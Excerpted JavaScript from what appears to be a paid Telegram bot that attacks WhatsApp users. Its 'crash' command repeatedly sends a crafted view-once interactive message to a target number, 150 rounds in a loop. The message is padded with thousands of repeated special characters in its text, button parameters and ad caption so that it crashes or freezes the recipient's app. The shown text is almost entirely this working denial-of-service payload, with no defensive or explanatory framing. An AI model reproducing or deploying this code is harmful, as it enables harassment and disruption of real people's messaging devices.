...
const databaseUrl = "https://raw.githubusercontent.com/wahyu3215/arya/refs/heads/main/arya.json";
...
⌑ Status: Process`,
  ...
  for (let i = 0; i < 150; i++) {
    await invisibleDozer(sock, target);
    await sleep(400);
    await invisibleDozer(sock, target);
    await sleep(2000);
  }
...
bot.command("crash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
...
async function InvisXcrash(sock, target) {
  let Ketenangan = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { messageSecret: crypto.randomBytes(64) },
        interactiveResponseMessage: {
          body: { text: "⎋Click Here!" + "ꦾ".repeat(500), 
          format: "DEFAULT" },
           nativeFlowMessage: {
              buttons: [
                {
              ...
              {
              name: "cta_url",
              buttonParamsJson: "ꦾ".repeat(1500),
              version: 3
              },
              {
              name: "cta_call",
        ...
        contextInfo: {
        externalAdReply: {
          title: "Air adalah titik ketenangan🌊" + "ꦽ".repeat(500),
          body: "Ombak yang sunyi 🌊" + "ꦾ".repeat(200),
          thumbnailUrl: "https://Fucking.Vercel.App", 
          mediaType: 2,
          mediaUrl: "https://wa.me/stickerpack/VerseOffcial", 
          sourceUrl: "https://wa.me/stickerpack/VerseOffcial", 
          showAdAddtribution: false, 
          quotedAd: {
            advertiserName: "Verse🐲",
            mediaType: "VCARD",
            jpegThumbnail: null,
            caption: `https://충돌.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          },
          placeholderKey: {
            remoteJid: "919171917181@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890",
                  }
                }
  ...
  await sock.relayMessage("status@broadcast", Ketenangan.message, {
    messageId: Ketenangan.key.id,
